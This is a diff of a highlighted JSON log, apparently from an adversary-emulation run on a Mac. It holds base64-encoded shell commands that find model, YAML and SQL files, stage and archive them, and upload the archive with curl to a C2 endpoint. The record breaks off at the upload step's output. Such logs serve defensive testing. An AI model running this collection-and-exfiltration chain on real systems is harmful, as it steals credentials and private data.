+<span class="w">          </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:07:20Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;attack&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;collection&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1074.001&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Data Staged: Local Data Staging&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;bWtkaXIgLXAgc3RhZ2VkICYmIGVjaG8gJFBXRC9zdGFnZWQ=&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;delegated&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:07:07Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;create a directory for exfil staging&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;link_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;d52a51ff-b7af-44a1-a2f8-2f2fa68b5c73&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Create staging directory&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;output&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;stdout&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/Users/foo/staged&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;stderr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;exit_code&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">56272</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;run&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:07:20Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">        </span><span class="p">},</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;90c2efaa-8205-480d-8bb6-61d90dbaf81b&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:08:02Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;attack&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;collection&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1005&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Data from Local System&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ZmluZCAvVXNlcnMgLW5hbWUgJyoucHQnIC10eXBlIGYgLW5vdCAtcGF0aCAnKi9cLionIC1zaXplIC01MDBrIDI+L2Rldi9udWxsIHwgaGVhZCAtNQ==&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;delegated&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:07:22Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Locate files deemed sensitive&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;link_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;719378af-2f64-4902-9b51-fb506166032f&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Find files&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;output&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;stdout&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/Users/foo/bar/PyTorch\\ Models/myModel.pt&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;stderr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;exit_code&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">56376</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;run&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:08:56Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">        </span><span class="p">},</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;90c2efaa-8205-480d-8bb6-61d90dbaf81b&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:09:02Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;attack&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;collection&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1005&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Data from Local System&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ZmluZCAvVXNlcnMgLW5hbWUgJyoueW1sJyAtdHlwZSBmIC1ub3QgLXBhdGggJyovXC4qJyAtc2l6ZSAtNTAwayAyPi9kZXYvbnVsbCB8IGhlYWQgLTU=&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;delegated&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:08:57Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Locate files deemed sensitive&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;link_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ddf2aa96-24a1-4e71-8360-637a821b0781&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Find files&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;output&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;stdout&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/Users/foo/bar/credentials.yml&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;stderr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;exit_code&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">56562</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;run&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:09:07Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">        </span><span class="p">},</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;90c2efaa-8205-480d-8bb6-61d90dbaf81b&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:09:53Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;attack&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;collection&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1005&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Data from Local System&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ZmluZCAvVXNlcnMgLW5hbWUgJyouc3FsJyAtdHlwZSBmIC1ub3QgLXBhdGggJyovXC4qJyAtc2l6ZSAtNTAwayAyPi9kZXYvbnVsbCB8IGhlYWQgLTU=&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;delegated&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:09:12Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Locate files deemed sensitive&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;link_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;fa7ac865-004d-4296-9d68-fd425a481b5e&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Find files&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;output&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;stdout&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/Users/foo/bar/sensitive.sql&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;stderr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;exit_code&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">56809</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;run&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:10:45Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">        </span><span class="p">},</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;4e97e699-93d7-4040-b5a3-2e906a58199e&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:10:55Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;attack&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;collection&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1074.001&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Data Staged: Local Data Staging&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Y3AgIi9Vc2Vycy9jamVsbGVuL0RvY3VtZW50cy9kZW1vL1B5VG9yY2hcIE1vZGVscy9teU1vZGVsLW5pZ2h0bHkucHQiIC9Vc2Vycy9jamVsbGVuL3N0YWdlZA==&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;delegated&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:10:47Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;copy files to staging directory&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;link_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;4a55c2c9-eb9d-4e31-b2b6-8bb4b4ab2950&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Stage sensitive files&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;output&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;stdout&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;stderr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;cp: /Users/foo/bar/PyTorch\\ Models/myModel.pt: No such file or directory&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;exit_code&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">57005</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;run&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:10:55Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">        </span><span class="p">},</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;4e97e699-93d7-4040-b5a3-2e906a58199e&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:11:34Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;attack&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;collection&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1074.001&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Data Staged: Local Data Staging&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Y3AgIi9Vc2Vycy9jamVsbGVuL29wdC9hbmFjb25kYTMvZW52cy9mYWlyL2xpYi9weXRob24zLjgvc2l0ZS1wYWNrYWdlcy9zYWNyZW1vc2VzL2RhdGEvbm9uYnJlYWtpbmdfcHJlZml4ZXMvbm9uYnJlYWtpbmdfcHJlZml4LnB0IiAvVXNlcnMvY2plbGxlbi9zdGFnZWQ=&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;delegated&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:10:57Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;copy files to staging directory&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;link_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;a5ef6774-6eed-4383-a769-420092e1ba27&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Stage sensitive files&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">57105</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;run&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:11:34Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">        </span><span class="p">},</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;4e97e699-93d7-4040-b5a3-2e906a58199e&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:12:22Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;attack&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;collection&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1074.001&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Data Staged: Local Data Staging&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Y3AgIi9Vc2Vycy9jamVsbGVuL29wdC9hbmFjb25kYTMvbGliL3B5dGhvbjMuOC9zaXRlLXBhY2thZ2VzL3NhY3JlbW9zZXMvZGF0YS9ub25icmVha2luZ19wcmVmaXhlcy9ub25icmVha2luZ19wcmVmaXgucHQiIC9Vc2Vycy9jamVsbGVuL3N0YWdlZA==&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;delegated&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:11:37Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;copy files to staging directory&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;link_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;b2ba877c-2501-4abc-89a0-aeada909f52b&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Stage sensitive files&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">57294</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;run&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:12:22Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">        </span><span class="p">},</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;300157e5-f4ad-4569-b533-9d1fa0e74d74&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:13:02Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;attack&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;exfiltration&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1560.001&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Archive Collected Data: Archive via Utility&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;dGFyIC1QIC16Y2YgL1VzZXJzL2NqZWxsZW4vc3RhZ2VkLnRhci5neiAvVXNlcnMvY2plbGxlbi9zdGFnZWQgJiYgZWNobyAvVXNlcnMvY2plbGxlbi9zdGFnZWQudGFyLmd6&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;delegated&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:12:27Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Compress a directory on the file system&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;link_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;795b4b12-1355-49ea-96e8-f6d3d045334d&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Compress staged directory&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;output&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;stdout&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/Users/foo/staged.tar.gz&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;stderr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;exit_code&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;pid&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">57383</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;platform&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;darwin&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;run&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:13:02Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">        </span><span class="p">},</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="nt">&quot;ability_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ea713bc4-63f0-491c-9a6f-0b01d560b87e&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;agent_reported_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:14:02Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;attack&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nt">&quot;tactic&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;exfiltration&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;T1041&quot;</span><span class="p">,</span>
+<span class="w">            </span><span class="nt">&quot;technique_name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Exfiltration Over C2 Channel&quot;</span>
+<span class="w">          </span><span class="p">},</span>
+<span class="w">          </span><span class="nt">&quot;command&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Y3VybCAtRiAiZGF0YT1AL1VzZXJzL2NqZWxsZW4vc3RhZ2VkLnRhci5neiIgLS1oZWFkZXIgIlgtUmVxdWVzdC1JRDogYGhvc3RuYW1lYC12cmdpcngiIGh0dHA6Ly8wLjAuMC4wOjg4ODgvZmlsZS91cGxvYWQ=&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;delegated&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-05-11T22:13:07Z&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;description&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Exfil the staged directory&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;executor&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sh&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;link_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;bda3e573-d751-420b-8740-d4a36cee1f9d&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Exfil staged directory&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">&quot;output&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
